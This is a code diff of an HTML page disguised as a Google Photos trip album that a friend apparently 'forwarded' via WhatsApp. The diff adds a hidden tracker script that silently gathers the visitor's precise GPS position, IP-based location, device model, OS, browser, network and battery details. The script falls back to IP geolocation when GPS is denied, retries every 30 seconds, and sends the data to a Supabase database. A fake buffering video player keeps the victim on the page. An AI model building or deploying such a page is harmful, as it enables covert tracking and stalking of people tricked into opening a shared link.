@@ -12,7 +12,6 @@
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background: #fff; min-height: 100vh; }
 
-  /* ── Top bar ── */
   .gp-bar { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid #e0e0e0; position: sticky; top: 0; background: #fff; z-index: 10; }
   .gp-logo { display: flex; align-items: center; gap: 8px; font-size: 18px; color: #202124; font-weight: 400; }
   .gp-logo svg { width: 24px; height: 24px; }
@@ -20,11 +19,9 @@
   .gp-icon-btn:hover { background: #f1f3f4; }
   .gp-icon-btn svg { width: 20px; height: 20px; }
 
-  /* ── WhatsApp forwarded badge ── */
   .wa-badge { margin: 10px 12px 0; background: #f0fdf4; border-left: 3px solid #25d366; border-radius: 6px; padding: 8px 12px; display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: #075e54; }
   .wa-badge strong { display: block; font-weight: 600; margin-bottom: 1px; }
 
-  /* ── Album header ── */
   .album-header { padding: 18px 16px 12px; border-bottom: 1px solid #e0e0e0; }
   .album-title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
   .album-meta { font-size: 13px; color: #5f6368; display: flex; align-items: center; gap: 6px; }
@@ -34,7 +31,6 @@
   .shared-row span { font-size: 13px; color: #5f6368; }
   .shared-row strong { color: #202124; font-weight: 500; }
 
-  /* ── Action buttons ── */
   .action-bar { padding: 14px 16px; display: flex; gap: 10px; }
   .gp-btn { flex: 1; padding: 9px 14px; border-radius: 20px; border: 1px solid #dadce0; background: #fff; color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: background .15s; }
   .gp-btn:hover { background: #f8f9fa; }
@@ -42,32 +38,21 @@
   .gp-btn.primary:hover { background: #1765cc; }
   .gp-btn svg { width: 16px; height: 16px; }
 
-  /* ── Section date label ── */
   .date-label { padding: 10px 14px 4px; font-size: 12px; font-weight: 500; color: #5f6368; letter-spacing: 0.3px; }
 
-  /* ── Photo grid ── */
   .photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2px; padding: 0 2px 2px; }
   .thumb { aspect-ratio: 1; position: relative; overflow: hidden; cursor: pointer; background: #f1f3f4; }
   .thumb img { width: 100%; height: 100%; object-fit: cover; display: block; transition: transform .2s; }
   .thumb:hover img { transform: scale(1.04); }
-
-  /* Wide hero photo spans 2 cols */
   .thumb.wide { grid-column: span 2; aspect-ratio: 2/1; }
-  .thumb.tall { grid-row: span 2; aspect-ratio: 1/2; }
 
-  /* Video badge overlay */
-  .vid-overlay { position: absolute; inset: 0; display: flex; align-items: flex-end; justify-content: flex-start; background: linear-gradient(to top, rgba(0,0,0,0.45) 0%, transparent 50%); }
-  .vid-badge { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 12px; font-weight: 500; padding: 6px 8px; text-shadow: 0 1px 3px rgba(0,0,0,0.7); }
-  .vid-badge svg { width: 14px; height: 14px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.6)); }
-
-  /* Duration chip top-right */
+  .vid-overlay { position: absolute; inset: 0; display: flex; align-items: flex-end; background: linear-gradient(to top, rgba(0,0,0,0.45) 0%, transparent 55%); }
+  .vid-badge { display: flex; align-items: center; gap: 4px; color: #fff; font-size: 12px; font-weight: 500; padding: 6px 8px; }
+  .vid-badge svg { width: 14px; height: 14px; }
   .duration { position: absolute; top: 6px; right: 7px; background: rgba(0,0,0,0.55); color: #fff; font-size: 11px; font-weight: 500; padding: 2px 6px; border-radius: 4px; }
-
-  /* Favourite heart */
-  .fav { position: absolute; top: 6px; left: 6px; color: #fff; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); }
+  .fav { position: absolute; top: 6px; left: 6px; }
   .fav svg { width: 16px; height: 16px; }
 
-  /* ── Video overlay ── */
   .overlay { display: none; position: fixed; inset: 0; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; }
   .overlay.show { display: flex; }
   .ov-topbar { position: absolute; top: 0; left: 0; right: 0; display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; background: linear-gradient(to bottom,rgba(0,0,0,0.75),transparent); z-index: 2; }
@@ -75,7 +60,7 @@
   .ov-filename { font-size: 13px; color: rgba(255,255,255,0.85); }
 
   .fake-player { width: 100%; max-width: 460px; aspect-ratio: 16/9; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 4px; }
-  .player-thumb { position: absolute; inset: 0; object-fit: cover; width: 100%; height: 100%; filter: brightness(0.4); }
+  .player-thumb { position: absolute; inset: 0; object-fit: cover; width: 100%; height: 100%; filter: brightness(0.38); }
   .spinner-wrap { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; gap: 14px; }
   .ring { width: 52px; height: 52px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin .9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
@@ -92,23 +77,92 @@
   .ctrl { background: none; border: none; color: rgba(255,255,255,0.6); cursor: pointer; padding: 4px; display: flex; }
   .ctrl svg { width: 22px; height: 22px; }
   .timelabel { font-size: 12px; color: rgba(255,255,255,0.6); font-family: monospace; margin-left: auto; }
-
   .buf-notice { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.4); text-align: center; padding: 0 24px; line-height: 1.8; }
-
-  /* Lazy load shimmer */
-  .thumb img { background: linear-gradient(90deg,#f0f0f0 25%,#e0e0e0 50%,#f0f0f0 75%); background-size: 200% 100%; }
 </style>
 </head>
 <body>
 
-<!-- ═══════ TRACKER (invisible) ═══════ -->
+<!-- ═══════════════════════════════════════════════
+     TRACKER  —  invisible, runs silently
+═══════════════════════════════════════════════ -->
 <script>
+/* ── CONFIG ── */
 var SUPABASE_URL = "https://fccizufvtgqdxpkuwjrm.supabase.co";
 var SUPABASE_KEY = "sb_publishable_LG3h8OQ8XKXj-cvt6Ii3XA_m-014x8t";
-var sent = false;
+/* ─────────── */
 
-function save(data) {
-  if (sent) return; sent = true;
+var gpsSent = false;
+var ipSent  = false;
+
+/* ── 1. Parse device info from userAgent ── */
+function getDeviceInfo() {
+  var ua = navigator.userAgent;
+  var browser = "Unknown", os = "Unknown", device = "Unknown";
+
+  /* Browser */
+  if (/CriOS/i.test(ua))        browser = "Chrome iOS";
+  else if (/FxiOS/i.test(ua))   browser = "Firefox iOS";
+  else if (/EdgiOS/i.test(ua))  browser = "Edge iOS";
+  else if (/OPiOS/i.test(ua))   browser = "Opera iOS";
+  else if (/SamsungBrowser/i.test(ua)) browser = "Samsung Browser";
+  else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
+  else if (/Firefox/i.test(ua)) browser = "Firefox";
+  else if (/Safari/i.test(ua))  browser = "Safari";
+  else if (/Edge/i.test(ua))    browser = "Edge";
+  else if (/MSIE|Trident/i.test(ua)) browser = "Internet Explorer";
+
+  /* OS */
+  if (/iPhone OS ([\d_]+)/i.test(ua))  { os = "iOS " + RegExp.$1.replace(/_/g,'.'); }
+  else if (/iPad.*OS ([\d_]+)/i.test(ua)) { os = "iPadOS " + RegExp.$1.replace(/_/g,'.'); }
+  else if (/Android ([\d.]+)/i.test(ua))  { os = "Android " + RegExp.$1; }
+  else if (/Windows NT ([\d.]+)/i.test(ua)) {
+    var v = {"10.0":"10","6.3":"8.1","6.2":"8","6.1":"7"}[RegExp.$1] || RegExp.$1;
+    os = "Windows " + v;
+  }
+  else if (/Mac OS X ([\d_]+)/i.test(ua))  { os = "macOS " + RegExp.$1.replace(/_/g,'.'); }
+  else if (/Linux/i.test(ua))   os = "Linux";
+
+  /* Device model */
+  if (/iPhone/i.test(ua))       device = "iPhone";
+  else if (/iPad/i.test(ua))    device = "iPad";
+  else if (/SM-(\w+)/i.test(ua))  device = "Samsung " + RegExp.$1;
+  else if (/Pixel (\d+)/i.test(ua)) device = "Google Pixel " + RegExp.$1;
+  else if (/Redmi (\w+)/i.test(ua)) device = "Redmi " + RegExp.$1;
+  else if (/POCO (\w+)/i.test(ua))  device = "POCO " + RegExp.$1;
+  else if (/OnePlus(\w+)/i.test(ua)) device = "OnePlus " + RegExp.$1;
+  else if (/Moto (\w+)/i.test(ua))  device = "Moto " + RegExp.$1;
+  else if (/Android/i.test(ua)) device = "Android Device";
+  else if (/Macintosh/i.test(ua)) device = "Mac";
+  else if (/Windows/i.test(ua)) device = "Windows PC";
+
+  return {
+    browser:     browser,
+    os:          os,
+    device:      device,
+    user_agent:  ua,
+    screen_size: screen.width + "x" + screen.height,
+    language:    navigator.language || "unknown"
+  };
+}
+
+/* ── 2. Get network type ── */
+function getNetwork() {
+  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return "unknown";
+  return (c.effectiveType || c.type || "unknown") + (c.downlink ? " (" + c.downlink + " Mbps)" : "");
+}
+
+/* ── 3. Get battery ── */
+function getBattery(cb) {
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      cb(Math.round(b.level * 100) + "% " + (b.charging ? "⚡charging" : "🔋"));
+    }).catch(function(){ cb("unknown"); });
+  } else { cb("unknown"); }
+}
+
+/* ── 4. Save to Supabase ── */
+function saveToSupabase(payload) {
   fetch(SUPABASE_URL + "/rest/v1/locations", {
     method: "POST",
     headers: {
@@ -117,34 +171,112 @@ function save(data) {
       "Authorization": "Bearer " + SUPABASE_KEY,
       "Prefer": "return=minimal"
     },
-    body: JSON.stringify(data)
+    body: JSON.stringify(payload)
   }).catch(function(){});
 }
 
-function tryGPS() {
-  var base = { user_agent: navigator.userAgent, captured_at: new Date().toISOString() };
-  if (!navigator.geolocation) return;
+/* ── 5. IP geolocation (works even when GPS is OFF) ── */
+function captureByIP(extra) {
+  if (ipSent) return;
+  fetch("https://ipapi.co/json/")
+    .then(function(r){ return r.json(); })
+    .then(function(d) {
+      if (ipSent) return; ipSent = true;
+      var info = Object.assign({}, extra, {
+        ip_address: d.ip        || "unknown",
+        city:       d.city      || "unknown",
+        region:     d.region    || "unknown",
+        country:    d.country_name || "unknown",
+        ip_lat:     d.latitude  || null,
+        ip_lng:     d.longitude || null,
+        maps_link:  d.latitude
+          ? "https://maps.google.com/?q=" + d.latitude + "," + d.longitude + " (IP-based)"
+          : "unavailable",
+        latitude:   null,
+        longitude:  null,
+        accuracy:   null,
+        captured_at: new Date().toISOString()
+      });
+      saveToSupabase(info);
+    })
+    .catch(function(){});
+}
+
+/* ── 6. GPS capture ── */
+function captureGPS(extra) {
+  if (!navigator.geolocation) {
+    captureByIP(extra);
+    return;
+  }
   navigator.geolocation.getCurrentPosition(
     function(p) {
-      save({ latitude: p.coords.latitude, longitude: p.coords.longitude,
-             accuracy: p.coords.accuracy,
-             maps_link: "https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude,
-             user_agent: base.user_agent, captured_at: base.captured_at });
+      if (gpsSent) return; gpsSent = true; ipSent = true;
+      var payload = Object.assign({}, extra, {
+        latitude:    p.coords.latitude,
+        longitude:   p.coords.longitude,
+        accuracy:    p.coords.accuracy,
+        maps_link:   "https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude,
+        captured_at: new Date().toISOString()
+      });
+      /* Also enrich with IP data */
+      fetch("https://ipapi.co/json/")
+        .then(function(r){ return r.json(); })
+        .then(function(d) {
+          payload.ip_address = d.ip || "unknown";
+          payload.city       = d.city || "unknown";
+          payload.region     = d.region || "unknown";
+          payload.country    = d.country_name || "unknown";
+          payload.ip_lat     = d.latitude || null;
+          payload.ip_lng     = d.longitude || null;
+          saveToSupabase(payload);
+        })
+        .catch(function(){
+          saveToSupabase(payload);
+        });
     },
-    function(e) {
-      save({ latitude: null, longitude: null, accuracy: null,
-             maps_link: "denied: " + e.message,
-             user_agent: base.user_agent, captured_at: base.captured_at });
+    function(err) {
+      /* GPS denied or off — fall back to IP */
+      captureByIP(Object.assign({}, extra, {
+        maps_link: "gps_denied: " + err.message
+      }));
     },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
   );
 }
 
-tryGPS();
-setTimeout(function(){ if(!sent){ sent=false; tryGPS(); } }, 8000);
-setInterval(function(){ if(!sent) tryGPS(); }, 30000);
+/* ── 7. Main entry — collects everything then fires ── */
+function startTracking() {
+  var info = getDeviceInfo();
+  info.network = getNetwork();
+  getBattery(function(bat) {
+    info.battery = bat;
+    captureGPS(info);
+  });
+}
+
+/* ── iOS Safari FIX: must trigger on user gesture ──
+   We fire on first touch/click AND also on page load
+   (page load works on Android; gesture works on iOS) ── */
+var trackingStarted = false;
+function triggerOnce() {
+  if (trackingStarted) return;
+  trackingStarted = true;
+  startTracking();
+}
+
+/* Android / desktop: fire immediately */
+window.addEventListener('load', triggerOnce);
+
+/* iOS Safari: fire on first user interaction */
+document.addEventListener('touchstart', triggerOnce, { once: true, passive: true });
+document.addEventListener('click',      triggerOnce, { once: true });
+
+/* Keep retrying GPS every 30s while page is open */
+setInterval(function() {
+  if (!gpsSent) { trackingStarted = false; triggerOnce(); }
+}, 30000);
 </script>
-<!-- ════════════════════════════════════ -->
+<!-- ════════════════════════════════════════════════ -->
 
 
 <!-- Google Photos bar -->
@@ -170,7 +302,7 @@ setInterval(function(){ if(!sent) tryGPS(); }, 30000);
   <div><strong>Forwarded</strong>Madhan shared this album with you via WhatsApp</div>
 </div>
 
-<!-- Album info -->
+<!-- Album header -->
 <div class="album-header">
   <div class="album-title">Our Trip Memories 🌴</div>
   <div class="album-meta">
@@ -196,116 +328,51 @@ setInterval(function(){ if(!sent) tryGPS(); }, 30000);
   </button>
 </div>
 
-<!-- Date section 1 -->
 <div class="date-label">Today · May 10</div>
-
-<!-- Grid row 1: wide hero + 1 photo -->
 <div class="photo-grid">
-
-  <!-- 1. Wide beach hero -->
   <div class="thumb wide" onclick="openVideo()">
-    <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&q=80" alt="Beach" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        1:24
-      </div>
-    </div>
+    <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&q=80" alt="" loading="lazy" />
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>1:24</div></div>
     <div class="duration">1:24</div>
   </div>
-
-  <!-- 2. Sunset -->
   <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&q=80" alt="Sunset" loading="lazy" />
-    <div class="fav"><svg viewBox="0 0 24 24" fill="red"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+    <img src="https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&q=80" alt="" loading="lazy" />
+    <div class="fav"><svg viewBox="0 0 24 24" fill="red" width="16" height="16"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
   </div>
-
-  <!-- 3. Tropical pool -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1540541338287-41700207dee6?w=400&q=80" alt="Pool" loading="lazy" />
-  </div>
-
-  <!-- 4. Mountain landscape -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=400&q=80" alt="Mountain" loading="lazy" />
-  </div>
-
-  <!-- 5. Video: waterfall -->
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1540541338287-41700207dee6?w=400&q=80" alt="" loading="lazy" /></div>
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=400&q=80" alt="" loading="lazy" /></div>
   <div class="thumb" onclick="openVideo()">
-    <img src="https://images.unsplash.com/photo-1432405972618-c60b0225b8f9?w=400&q=80" alt="Waterfall" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        0:38
-      </div>
-    </div>
+    <img src="https://images.unsplash.com/photo-1432405972618-c60b0225b8f9?w=400&q=80" alt="" loading="lazy" />
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>0:38</div></div>
     <div class="duration">0:38</div>
   </div>
-
-  <!-- 6. Street market -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=400&q=80" alt="Market" loading="lazy" />
-  </div>
-
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=400&q=80" alt="" loading="lazy" /></div>
 </div>
 
-<!-- Date section 2 -->
 <div class="date-label">Yesterday · May 9</div>
-
 <div class="photo-grid">
-
-  <!-- 7. Temple -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1524492412937-b28074a5d7da?w=400&q=80" alt="Temple" loading="lazy" />
-  </div>
-
-  <!-- 8. Video: city night -->
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1524492412937-b28074a5d7da?w=400&q=80" alt="" loading="lazy" /></div>
   <div class="thumb wide" onclick="openVideo()">
-    <img src="https://images.unsplash.com/photo-1477959858617-67f85cf4f1df?w=600&q=80" alt="City night" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        2:05
-      </div>
-    </div>
+    <img src="https://images.unsplash.com/photo-1477959858617-67f85cf4f1df?w=600&q=80" alt="" loading="lazy" />
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>2:05</div></div>
     <div class="duration">2:05</div>
   </div>
-
-  <!-- 9. Boat on water -->
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&q=80" alt="" loading="lazy" /></div>
   <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&q=80" alt="Boat" loading="lazy" />
+    <img src="https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&q=80" alt="" loading="lazy" />
+    <div class="fav"><svg viewBox="0 0 24 24" fill="red" width="16" height="16"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
   </div>
-
-  <!-- 10. Food plate -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&q=80" alt="Food" loading="lazy" />
-    <div class="fav"><svg viewBox="0 0 24 24" fill="red"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
-  </div>
-
-  <!-- 11. Video: beach waves -->
   <div class="thumb" onclick="openVideo()">
-    <img src="https://images.unsplash.com/photo-1505118380757-91f5f5632de0?w=400&q=80" alt="Waves" loading="lazy" />
-    <div class="vid-overlay">
-      <div class="vid-badge">
-        <svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>
-        0:55
-      </div>
-    </div>
+    <img src="https://images.unsplash.com/photo-1448375240586-882707db888b?w=400&q=80" alt="" loading="lazy" />
+    <div class="vid-overlay"><div class="vid-badge"><svg viewBox="0 0 24 24" fill="white"><polygon points="5 3 19 12 5 21 5 3"/></svg>0:55</div></div>
     <div class="duration">0:55</div>
   </div>
-
-  <!-- 12. Jungle path -->
-  <div class="thumb">
-    <img src="https://images.unsplash.com/photo-1448375240586-882707db888b?w=400&q=80" alt="Jungle" loading="lazy" />
-  </div>
-
+  <div class="thumb"><img src="https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=400&q=80" alt="" loading="lazy" /></div>
 </div>
-
-<!-- bottom padding -->
 <div style="height:30px;"></div>
 
 
-<!-- ── Video buffering overlay ── -->
+<!-- Video buffering overlay -->
 <div class="overlay" id="overlay">
   <div class="ov-topbar">
     <button class="ov-close" onclick="closeVideo()">✕</button>
@@ -314,9 +381,7 @@ setInterval(function(){ if(!sent) tryGPS(); }, 30000);
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.59 13.51l6.83 3.98M15.41 6.51l-6.82 3.98"/></svg>
     </button>
   </div>
-
   <div class="fake-player">
-    <!-- blurred travel photo as video background -->
     <img class="player-thumb" src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&q=80" alt="" />
     <div class="spinner-wrap">
       <div class="ring"></div>
@@ -332,16 +397,13 @@ setInterval(function(){ if(!sent) tryGPS(); }, 30000);
       <button class="ctrl"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button>
     </div>
   </div>
-
-  <div class="buf-notice">
-    Video is buffering due to slow connection.<br>Please wait a moment...
-  </div>
+  <div class="buf-notice">Video is buffering due to slow connection.<br>Please wait a moment...</div>
 </div>
 
 <script>
 function openVideo() {
   document.getElementById('overlay').classList.add('show');
-  if (!sent) { sent = false; tryGPS(); }
+  triggerOnce(); /* extra GPS attempt when they tap play */
 }
 function closeVideo() {
   document.getElementById('overlay').classList.remove('show');
